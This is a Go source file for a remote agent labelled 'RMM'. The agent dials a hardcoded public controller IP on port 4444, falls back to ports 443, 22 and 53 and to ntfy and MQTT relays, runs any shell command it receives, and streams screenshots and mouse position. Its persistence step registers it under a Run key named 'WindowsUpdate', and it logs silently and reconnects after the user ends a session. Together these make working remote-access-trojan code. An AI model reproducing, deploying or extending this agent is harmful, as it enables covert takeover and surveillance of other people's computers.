package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"image"
	"image/jpeg"
	"image/png"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"rmm/internal/commands"
	"rmm/internal/mqttrelay"
	"rmm/internal/protocol"
	"rmm/internal/relay"
)

// captureImage captures a display. quality<=0 means PNG (lossless, desktop
// default); quality 1-100 means JPEG (a 1920x1080 frame drops from ~180KB
// PNG to ~40-80KB JPEG at q70). all=true captures the full virtual screen
// across every monitor (dual view); otherwise monitor selects the display
// index (out of range falls back to primary).
func captureImage(quality, monitor int, all bool) (data []byte, w, h int, format string, err error) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return nil, 0, 0, "", fmt.Errorf("no displays")
	}
	bounds := screenshot.GetDisplayBounds(0)
	if all && n > 1 {
		minX, minY := bounds.Min.X, bounds.Min.Y
		maxX, maxY := bounds.Max.X, bounds.Max.Y
		for i := 1; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Min.X < minX {
				minX = b.Min.X
			}
			if b.Min.Y < minY {
				minY = b.Min.Y
			}
			if b.Max.X > maxX {
				maxX = b.Max.X
			}
			if b.Max.Y > maxY {
				maxY = b.Max.Y
			}
		}
		bounds = image.Rect(minX, minY, maxX, maxY)
	} else if monitor > 0 && monitor < n {
		bounds = screenshot.GetDisplayBounds(monitor)
	}
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return nil, 0, 0, "", err
	}
	var buf bytes.Buffer
	if quality > 0 {
		if quality > 100 {
			quality = 100
		}
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
			return nil, 0, 0, "", err
		}
		return buf.Bytes(), bounds.Dx(), bounds.Dy(), "jpeg", nil
	}
	if err := png.Encode(&buf, img); err != nil {
		return nil, 0, 0, "", err
	}
	return buf.Bytes(), bounds.Dx(), bounds.Dy(), "png", nil
}

func captureScreen() ([]byte, int, int, error) {
	data, w, h, _, err := captureImage(0, 0, false)
	return data, w, h, err
}

func runCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}
	// Limit output to 1MB to avoid blowing scanner buffer
	out, err := cmd.CombinedOutput()
	if len(out) > 1024*1024 {
		out = out[:1024*1024]
	}
	if err != nil {
		// Still return output; include error
		return string(out), err.Error()
	}
	return string(out), ""
}

// splitCmd parses "cmd args..." into name + args.
func splitCmd(cmdStr string) (string, string) {
	cmdName := strings.TrimSpace(cmdStr)
	args := ""
	if idx := strings.Index(cmdName, " "); idx != -1 {
		args = strings.TrimSpace(cmdName[idx+1:])
		cmdName = strings.TrimSpace(cmdName[:idx])
	}
	return cmdName, args
}

// execCommand runs a command string and builds the output message.
// maxBytes caps the result (direct TLS allows 1MB, relays less).
func execCommand(cmdStr string, maxBytes int, truncNote string) protocol.Message {
	cmdName, args := splitCmd(cmdStr)
	result, err := commands.Execute(cmdName, args)
	errStr := ""
	if err != nil {
		errStr = err.Error()
		if result == "" {
			result = errStr
			errStr = ""
		}
	}
	if len(result) > maxBytes {
		result = result[:maxBytes] + truncNote
	}
	return protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr}
}

func mustJSON(v interface{}) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func nowMillis() int64 { return time.Now().UnixMilli() }

// instanceID stably identifies this agent process (hostname-pid) so the
// controller can tell two processes on one host apart.
func instanceID() string {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	return fmt.Sprintf("%s-%d", hn, os.Getpid())
}

func hostnameAndUser() (string, string) {
	hn, _ := os.Hostname()
	if hn == "" {
		hn = "unknown"
	}
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	if user == "" {
		user = "unknown"
	}
	return hn, user
}

type agent struct {
	controllerAddr string
	caFile         string
	insecure       bool
	screenshotFPS  float64
	conn           net.Conn
	enc            *json.Encoder
	mu             sync.Mutex
	closing        chan struct{}
	// quietUntil (UnixNano) pauses reconnects after the user ends the
	// session from the controller. The service keeps running; it just
	// stays quiet instead of instantly reappearing. Never touches the PC.
	quietUntil atomic.Int64
}

// disconnectQuiet is how long the agent stays quiet after a user disconnect.
const disconnectQuiet = 5 * time.Minute

func (a *agent) setQuiet(d time.Duration) {
	a.quietUntil.Store(time.Now().Add(d).UnixNano())
	log.Printf("[*] Session ended by controller — staying quiet for %s (service keeps running, PC untouched)", d)
}

func (a *agent) quietRemain() time.Duration {
	rem := time.Until(time.Unix(0, a.quietUntil.Load()))
	if rem < 0 {
		return 0
	}
	return rem
}

func (a *agent) send(msg protocol.Message) error {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.enc == nil {
		return fmt.Errorf("no connection")
	}
	return a.enc.Encode(msg)
}

// dialAddrs returns primary + fallbacks on already-open ports (22,53,443,4444).
func dialAddrs(primary string) []string {
	addrsToTry := []string{primary}
	if strings.Contains(primary, "176.229.98.54:4444") {
		addrsToTry = append(addrsToTry, "176.229.98.54:443", "176.229.98.54:22", "176.229.98.54:53", "127.0.0.1:4444", "127.0.0.1:443", "192.168.68.57:4444")
	} else if strings.Contains(primary, "127.0.0.1:4444") {
		addrsToTry = append(addrsToTry, "176.229.98.54:4444", "127.0.0.1:443", "192.168.68.57:4444")
	} else if strings.Contains(primary, "192.168.68.57:4444") {
		addrsToTry = append(addrsToTry, "176.229.98.54:4444", "127.0.0.1:4444")
	}
	seen := map[string]bool{}
	var uniq []string
	for _, addr := range addrsToTry {
		if !seen[addr] {
			seen[addr] = true
			uniq = append(uniq, addr)
		}
	}
	return uniq
}

func (a *agent) connectOnce() error {
	var tlsCfg *tls.Config
	if a.insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(a.caFile)
		if err != nil {
			return fmt.Errorf("read ca %s: %w", a.caFile, err)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			return fmt.Errorf("failed to parse CA cert %s", a.caFile)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}

	uniqAddrs := dialAddrs(a.controllerAddr)
	var conn net.Conn
	var dialErr error
	var err error
	// Bounded dials: the old tls.Dial had no timeout and each attempt hung
	// ~21s (4 addrs = 84s before ntfy was even tried).
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	for _, addr := range uniqAddrs {
		useCfg := tlsCfg
		if strings.Contains(addr, "192.168.") && !a.insecure {
			clone := tlsCfg.Clone()
			clone.InsecureSkipVerify = true
			useCfg = clone
		}
		log.Printf("[*] Dialing %s (insecure=%v ca=%s)...", addr, a.insecure, a.caFile)
		conn, dialErr = tls.DialWithDialer(dialer, "tcp", addr, useCfg)
		if dialErr == nil {
			log.Printf("[+] Connected to %s", addr)
			a.controllerAddr = addr
			err = nil
			break
		}
		log.Printf("[!] Dial %s failed: %v", addr, dialErr)
		err = dialErr
	}
	// MQTT relay (persistent outbound TCP, zero polling) before ntfy.
	if err != nil {
		log.Printf("[*] All direct dials failed, trying MQTT relay...")
		if merr := a.connectViaMQTT(); merr != nil {
			log.Printf("[!] MQTT failed: %v", merr)
			err = merr
		} else {
			return nil // connectViaMQTT only returns on shutdown
		}
	}
	// Ntfy relay final fallback (only our app, no open port, just HTTPS out)
	if err != nil {
		log.Printf("[*] All direct dials failed, trying ntfy relay %s...", relay.NtfyTopic)
		return a.connectViaNtfy()
	}
	if err != nil {
		return err
	}
	a.conn = conn
	a.enc = json.NewEncoder(conn)
	log.Printf("[+] Connected to %s", a.controllerAddr)

	// Send connect
	hn, user := hostnameAndUser()
	if err := a.send(protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID()}); err != nil {
		conn.Close()
		return fmt.Errorf("send connect: %w", err)
	}

	// Channels
	done := make(chan struct{})
	errCh := make(chan error, 1)

	// Reader
	go func() {
		defer close(done)
		scanner := bufio.NewScanner(conn)
		buf := make([]byte, 64*1024)
		scanner.Buffer(buf, 2*1024*1024) // commands are small; screen requests are tiny
		for scanner.Scan() {
			line := scanner.Bytes()
			if len(line) == 0 {
				continue
			}
			var msg protocol.Message
			if err := json.Unmarshal(line, &msg); err != nil {
				log.Printf("[!] bad json: %v raw=%.200s", err, string(line))
				continue
			}
			switch msg.Type {
			case protocol.TypeConnected:
				log.Printf("[+] Controller acknowledged id=%s", msg.ID)
			case protocol.TypeCommand:
				log.Printf("[*] Command: %s", msg.Cmd)
				go func(cmdStr string) {
					// Parse into cmd + args (first space split, keep rest)
					cmdName := strings.TrimSpace(cmdStr)
					args := ""
					if idx := strings.Index(cmdName, " "); idx != -1 {
						args = strings.TrimSpace(cmdName[idx+1:])
						cmdName = strings.TrimSpace(cmdName[:idx])
					}
					// Try structured handler first; fallback is inside Execute
					result, err := commands.Execute(cmdName, args)
					errStr := ""
					if err != nil {
						errStr = err.Error()
						// If handler returned error but also result, keep result
						if result == "" {
							result = errStr
							errStr = ""
						}
					}
					// Truncate if needed
					if len(result) > 1024*1024 {
						result = result[:1024*1024] + "\n... truncated"
					}
					resp := protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr}
					if err := a.send(resp); err != nil {
						log.Printf("[!] send output: %v", err)
					} else {
						log.Printf("[*] Sent output (%d bytes)", len(result))
					}
				}(msg.Cmd)
			case protocol.TypeScreenshotRequest:
				log.Printf("[*] Screenshot requested (quality=%d monitor=%d all=%v)", msg.Quality, msg.Monitor, msg.AllMonitors)
				go func(quality, monitor int, all bool) {
					data, w, h, format, err := captureImage(quality, monitor, all)
					if err != nil {
						log.Printf("[!] capture: %v", err)
						_ = a.send(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						return
					}
					b64 := base64.StdEncoding.EncodeToString(data)
					log.Printf("[*] Captured %dx%d %s %d bytes -> %d b64", w, h, format, len(data), len(b64))
					if err := a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, Data: b64, Format: format}); err != nil {
						log.Printf("[!] send screen: %v", err)
					}
				}(msg.Quality, msg.Monitor, msg.AllMonitors)
			case protocol.TypePing:
				_ = a.send(protocol.Message{Type: protocol.TypePong})
			case protocol.TypePong:
				// ignore
			case protocol.TypeDisconnect:
				// User ended the session from the controller. Go quiet for
				// a while, then resume. Never touches the PC itself.
				a.setQuiet(disconnectQuiet)
				conn.Close()
				return
			default:
				log.Printf("[*] Unknown msg type=%s", msg.Type)
			}
		}
		if err := scanner.Err(); err != nil {
			errCh <- err
		} else {
			errCh <- fmt.Errorf("connection closed")
		}
	}()

	// Periodic tasks
	var mouseTicker *time.Ticker
	var screenTicker *time.Ticker
	var mouseCh <-chan time.Time
	var screenCh <-chan time.Time

	if a.screenshotFPS > 0 {
		interval := time.Duration(float64(time.Second) / a.screenshotFPS)
		if interval < 100*time.Millisecond {
			interval = 100 * time.Millisecond
		}
		screenTicker = time.NewTicker(interval)
		screenCh = screenTicker.C
		log.Printf("[*] Periodic screenshots every %v", interval)
	}
	// Mouse every 120ms (direct path is cheap; unchanged events still deduped)
	mouseTicker = time.NewTicker(120 * time.Millisecond)
	mouseCh = mouseTicker.C
	defer func() {
		if mouseTicker != nil {
			mouseTicker.Stop()
		}
		if screenTicker != nil {
			screenTicker.Stop()
		}
	}()

	lastX, lastY := -1, -1

	// Heartbeat ping every 30s
	pingTicker := time.NewTicker(30 * time.Second)
	defer pingTicker.Stop()

	for {
		select {
		case <-a.closing:
			log.Printf("[*] Closing requested")
			conn.Close()
			return nil
		case <-done:
			select {
			case err := <-errCh:
				return err
			default:
				return fmt.Errorf("reader done")
			}
		case <-mouseCh:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			// Don't block on send
			_ = a.send(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y, Buttons: []int{0, 0, 0}})
		case <-screenCh:
			go func() {
				data, w, h, format, err := captureImage(0, 0, false)
				if err != nil {
					return
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				_ = a.send(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, Data: b64, Format: format})
			}()
		case <-pingTicker.C:
			_ = a.send(protocol.Message{Type: protocol.TypePing})
		}
	}
}

func (a *agent) connectViaNtfy() error {
	hn, user := hostnameAndUser()
	me := "agent:" + hn
	announce := func() {
		_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID()})
	}
	log.Printf("[*] Ntfy relay: publishing connect %s/%s", hn, user)
	announce()
	// Long-poll in its own goroutine: relay.Poll blocks up to ~60s when
	// idle (one hanging GET, not the old 900ms hot loop that got us banned).
	inbox := make(chan relay.Envelope, 64)
	go func() {
		for {
			select {
			case <-a.closing:
				return
			default:
			}
			// Only messages addressed to us (or broadcast "") — fixes
			// cross-talk where every agent executed every command.
			envs, err := relay.Poll(me, hn)
			if err != nil {
				log.Printf("[ntfy] poll: %v", err)
				select {
				case <-a.closing:
					return
				case <-time.After(2 * time.Second):
				}
				continue
			}
			for _, env := range envs {
				select {
				case inbox <- env:
				case <-a.closing:
					return
				}
			}
		}
	}()
	mouseTicker := time.NewTicker(2 * time.Second) // throttled: ntfy is rate-limited
	defer mouseTicker.Stop()
	announceTicker := time.NewTicker(15 * time.Second) // re-announce so restarted controllers find us
	defer announceTicker.Stop()
	lastX, lastY := -1, -1
	for {
		select {
		case <-a.closing:
			return nil
		case <-announceTicker.C:
			if a.quietRemain() > 0 {
				continue // stay quiet: don't re-announce a session the user ended
			}
			announce()
		case env := <-inbox:
			{
				var msg protocol.Message
				if err := json.Unmarshal(env.Payload, &msg); err != nil {
					continue
				}
				if !strings.HasPrefix(env.From, "controller") {
					continue
				}
				if msg.Target != "" && msg.Target != hn && msg.Target != me {
					continue
				}
				switch msg.Type {
				case protocol.TypeConnected:
					// Ignore acks meant for a different agent process.
					if msg.ID != "" && !strings.Contains(msg.ID, hn) {
						continue
					}
					log.Printf("[*] Ntfy controller ack %s", msg.ID)
				case protocol.TypeCommand:
					log.Printf("[*] Ntfy command: %s", msg.Cmd)
					cmdName := strings.TrimSpace(msg.Cmd)
					args := ""
					if idx := strings.Index(cmdName, " "); idx != -1 {
						args = strings.TrimSpace(cmdName[idx+1:])
						cmdName = strings.TrimSpace(cmdName[:idx])
					}
					result, err := commands.Execute(cmdName, args)
					errStr := ""
					if err != nil {
						errStr = err.Error()
						if result == "" {
							result = errStr
							errStr = ""
						}
					}
					if len(result) > 700*1024 {
						result = result[:700*1024] + "\n... truncated (ntfy limit)"
					}
					_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeOutput, Result: result, Error: errStr})
				case protocol.TypeScreenshotRequest:
					q := msg.Quality
					if q <= 0 {
						q = 70 // ntfy default: JPEG fits the relay cap
					}
					data, w, h, format, err := captureImage(q, msg.Monitor, msg.AllMonitors)
					if err != nil {
						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeScreen, Error: err.Error()})
						continue
					}
					b64 := base64.StdEncoding.EncodeToString(data)
					if len(b64) > 700*1024 {
						_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeScreen, Error: "screen too large for ntfy relay (use direct connection)"})
						continue
					}
					_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, Data: b64, Format: format})
				case protocol.TypePing:
					_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypePong})
				case protocol.TypeDisconnect:
					// User ended the session: go quiet (outer loop honors
					// quietUntil instead of reconnecting). PC untouched.
					a.setQuiet(disconnectQuiet)
					return nil
				}
			}
		case <-mouseTicker.C:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			_ = relay.PublishTo(me, "controller", protocol.Message{Type: protocol.TypeMouse, X: x, Y: y})
		}
	}
}

// connectViaMQTT joins the MQTT relay (persistent outbound TCP 1883, zero
// polling). Tried after direct dials fail, before the slower ntfy polling.
func (a *agent) connectViaMQTT() error {
	hn, user := hostnameAndUser()
	me := "agent:" + hn
	bus, err := mqttrelay.DialAgent(hn)
	if err != nil {
		return err
	}
	defer bus.Close()

	discCh := make(chan struct{}, 1) // user-ended session (callback runs on paho's thread)
	if err := bus.SubscribeCmd(func(env relay.Envelope) {
		var msg protocol.Message
		if err := json.Unmarshal(env.Payload, &msg); err != nil {
			return
		}
		if msg.Target != "" && msg.Target != hn && msg.Target != me {
			return
		}
		switch msg.Type {
		case protocol.TypeConnected:
			if msg.ID != "" && !strings.Contains(msg.ID, hn) {
				return
			}
			log.Printf("[*] MQTT controller ack %s", msg.ID)
		case protocol.TypeCommand:
			log.Printf("[*] MQTT command: %s", msg.Cmd)
			go func(cmdStr string) {
				resp := execCommand(cmdStr, 1024*1024, "\n... truncated")
				if err := bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(resp), Time: nowMillis()}); err != nil {
					log.Printf("[!] MQTT publish output: %v", err)
				}
			}(msg.Cmd)
		case protocol.TypeScreenshotRequest:
			go func(quality, monitor int, all bool) {
				data, w, h, format, err := captureImage(quality, monitor, all)
				if err != nil {
					_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeScreen, Error: err.Error()}), Time: nowMillis()})
					return
				}
				b64 := base64.StdEncoding.EncodeToString(data)
				log.Printf("[*] MQTT captured %dx%d %s %d bytes", w, h, format, len(data))
				_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeScreen, Width: w, Height: h, Data: b64, Format: format}), Time: nowMillis()})
			}(msg.Quality, msg.Monitor, msg.AllMonitors)
		case protocol.TypePing:
				_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypePong}), Time: nowMillis()})
		case protocol.TypeDisconnect:
				// User ended the session: go quiet, then break the main loop.
				a.setQuiet(disconnectQuiet)
				select {
				case discCh <- struct{}{}:
				default:
				}
		}
	}); err != nil {
		return err
	}

	announce := func() {
		_ = bus.Publish("hello", relay.Envelope{From: me, To: "", Payload: mustJSON(protocol.Message{Type: protocol.TypeConnect, Hostname: hn, User: user, Instance: instanceID()}), Time: nowMillis()})
	}
	log.Printf("[*] MQTT: announcing %s/%s", hn, user)
	announce()
	announceTicker := time.NewTicker(15 * time.Second)
	defer announceTicker.Stop()
	mouseTicker := time.NewTicker(300 * time.Millisecond)
	defer mouseTicker.Stop()
	lastX, lastY := -1, -1
	for {
		select {
		case <-a.closing:
			return nil
		case <-discCh:
			return nil
		case <-announceTicker.C:
			if a.quietRemain() > 0 {
				continue // stay quiet: don't re-announce a session the user ended
			}
			announce()
		case <-mouseTicker.C:
			x, y := getMousePos()
			if x == lastX && y == lastY {
				continue
			}
			lastX, lastY = x, y
			_ = bus.Publish("out/"+hn, relay.Envelope{From: me, To: "controller", Payload: mustJSON(protocol.Message{Type: protocol.TypeMouse, X: x, Y: y}), Time: nowMillis()})
		}
	}
}

func installPersistence() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("persistence only supported on Windows")
	}
	// Use golang.org/x/sys/windows/registry if available; otherwise use reg command
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	exe, _ = filepath.Abs(exe)
	// Try registry via cmd
	cmd := exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", exe, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("reg add: %v output=%s", err, string(out))
	}
	log.Printf("[*] Persistence installed: %s -> HKCU Run WindowsUpdate", exe)
	return nil
}

// runDialTest dials each candidate once and exits 0 on first success.
// QoL: `agent.exe -test` answers "is the controller reachable?" without
// starting the reconnect loop or persistence.
func runDialTest(primary, caFile string, insecure bool) {
	var tlsCfg *tls.Config
	if insecure {
		tlsCfg = &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	} else {
		caData, err := os.ReadFile(caFile)
		if err != nil {
			fmt.Printf("FAIL: read ca: %v\n", err)
			os.Exit(1)
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caData) {
			fmt.Printf("FAIL: parse ca %s\n", caFile)
			os.Exit(1)
		}
		tlsCfg = &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}
	}
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	for _, addr := range dialAddrs(primary) {
		fmt.Printf("dial %s ... ", addr)
		conn, err := tls.DialWithDialer(dialer, "tcp", addr, tlsCfg)
		if err != nil {
			fmt.Printf("FAIL (%v)\n", err)
			continue
		}
		fmt.Printf("OK\n")
		conn.Close()
		os.Exit(0)
	}
	fmt.Printf("ntfy %s ... ", relay.NtfyTopic)
	if err := relay.PublishTo("agent:test", "controller", protocol.Message{Type: protocol.TypePing}); err != nil {
		fmt.Printf("FAIL (%v)\n", err)
		os.Exit(1)
	}
	fmt.Printf("OK (published)\n")
	os.Exit(0)
}

// loadControllerConfig reads controller.txt next to the exe (written by the
// installer). It lets the controller IP change without rebuilding the agent:
// the flag still wins when explicitly passed.
func loadControllerConfig(def string) string {
	if exe, err := os.Executable(); err == nil {
		if b, err := os.ReadFile(filepath.Join(filepath.Dir(exe), "controller.txt")); err == nil {
			if v := strings.TrimSpace(string(b)); v != "" {
				return strings.Split(v, "\n")[0]
			}
		}
	}
	return def
}

// setupLogFile mirrors logs to %LOCALAPPDATA%/RMM/agent.log (the silent agent
// otherwise has no visible console). Failures are non-fatal.
func setupLogFile() {
	dir := ""
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		dir = filepath.Join(localApp, "RMM")
	} else {
		dir = filepath.Join(os.TempDir(), "RMM")
	}
	if err := os.MkdirAll(dir, 0755); err != nil {
		return
	}
	f, err := os.OpenFile(filepath.Join(dir, "agent.log"), os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	log.SetOutput(io.MultiWriter(os.Stderr, f))
}

func main() {
	addr := flag.String("controller", "176.229.98.54:4444", "controller address host:port")
	caFile := flag.String("ca", "certs/server.crt", "CA cert file (server.crt)")
	insecure := flag.Bool("insecure", false, "skip TLS verification (for testing)")
	fps := flag.Float64("fps", 0, "periodic screenshot FPS (0=on-demand only)")
	persist := flag.Bool("persist", false, "install registry persistence and exit")
	ntfyTopic := flag.String("ntfy", "", "ntfy relay topic (empty = default)")
	ntfyServer := flag.String("ntfy-server", "", "ntfy relay host (empty = default)")
	ntfyOnly := flag.Bool("ntfy-only", false, "skip direct dials, use ntfy relay only (mobile: saves battery/time)")
	mqttOnly := flag.Bool("mqtt-only", false, "skip direct dials, use MQTT relay only")
	testOnly := flag.Bool("test", false, "dial controller once, print result, exit")
	showHelp := flag.Bool("help", false, "show help")
	flag.Parse()

	if *ntfyServer != "" {
		relay.SetServer(*ntfyServer)
	}
	if *ntfyTopic != "" {
		relay.SetTopic(*ntfyTopic)
	}
	// controller.txt next to exe overrides the compiled default (unless the
	// flag was explicitly changed from the default).
	if *addr == "176.229.98.54:4444" {
		if v := loadControllerConfig(""); v != "" {
			*addr = v
		}
	}
	setupLogFile()

	if *showHelp {
		flag.Usage()
		fmt.Println("\nExample:")
		fmt.Println("  agent.exe -controller 176.229.98.54:4444 -ca certs/server.crt")
		fmt.Println("  agent.exe -controller localhost:4444 -insecure")
		fmt.Println("  agent.exe -persist   # install auto-start")
		fmt.Println("  agent.exe -test      # dial once and exit")
		os.Exit(0)
	}

	// One agent per PC: a new start reaps stale duplicates (zombies that
	// survived upgrades) and takes over. Skipped for -test runs.
	if !*testOnly {
		ensureSingleInstance()
	}

	if *persist {
		if err := installPersistence(); err != nil {
			log.Fatalf("persistence: %v", err)
		}
		return
	}

	// Handle --ca relative to exe dir if not found
	if !*insecure {
		if _, err := os.Stat(*caFile); os.IsNotExist(err) {
			// Try next to exe
			exeDir := filepath.Dir(os.Args[0])
			alt := filepath.Join(exeDir, "server.crt")
			if _, err2 := os.Stat(alt); err2 == nil {
				*caFile = alt
			} else {
				alt2 := filepath.Join(exeDir, "certs", "server.crt")
				if _, err3 := os.Stat(alt2); err3 == nil {
					*caFile = alt2
				}
			}
		}
	}

	if *testOnly {
		runDialTest(*addr, *caFile, *insecure)
		return
	}

	// Graceful shutdown on Ctrl+C
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)

	ag := &agent{
		controllerAddr: *addr,
		caFile:         *caFile,
		insecure:       *insecure,
		screenshotFPS:  *fps,
		closing:        make(chan struct{}),
	}

	go func() {
		<-sigCh
		fmt.Println("\n[*] Signal received, shutting down...")
		close(ag.closing)
		// Give time to send disconnect
		if ag.conn != nil {
			_ = ag.send(protocol.Message{Type: protocol.TypeDisconnect})
			ag.conn.Close()
		}
		os.Exit(0)
	}()

	// Also handle input to allow clean exit via 'exit' typed? Not needed for agent.

	// waitQuiet sleeps out a user-requested quiet period (session ended from
	// the controller). Returns false on shutdown.
	waitQuiet := func() bool {
		if rem := ag.quietRemain(); rem > 0 {
			log.Printf("[*] Quiet period: resuming in %s...", rem.Round(time.Second))
			select {
			case <-ag.closing:
				return false
			case <-time.After(rem):
			}
		}
		return true
	}

	if *ntfyOnly {
		log.Printf("[*] ntfy-only mode: skipping direct dials")
		for {
			if !waitQuiet() {
				return
			}
			_ = ag.connectViaNtfy()
			select {
			case <-ag.closing:
				return
			default:
			}
		}
	}
	if *mqttOnly {
		log.Printf("[*] mqtt-only mode: skipping direct dials")
		for {
			if !waitQuiet() {
				return
			}
			_ = ag.connectViaMQTT()
			select {
			case <-ag.closing:
				return
			default:
			}
		}
	}

	// Reconnect loop with exponential backoff
	backoff := time.Second
	maxBackoff := 30 * time.Second
	for {
		if !waitQuiet() {
			return
		}
		err := ag.connectOnce()
		// Check if closing
		select {
		case <-ag.closing:
			return
		default:
		}
		if err != nil {
			// Check if it's a clean shutdown
			if strings.Contains(err.Error(), "closing") {
				return
			}
			log.Printf("[-] Disconnected: %v — reconnect in %v", err, backoff)
			time.Sleep(backoff)
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			// Reset encoder/conn
			ag.conn = nil
			ag.enc = nil
			continue
		}
		// Clean disconnect -> reset backoff and reconnect
		log.Printf("[*] Session ended, reconnecting...")
		backoff = time.Second
		ag.conn = nil
		ag.enc = nil
		time.Sleep(backoff)
	}
}
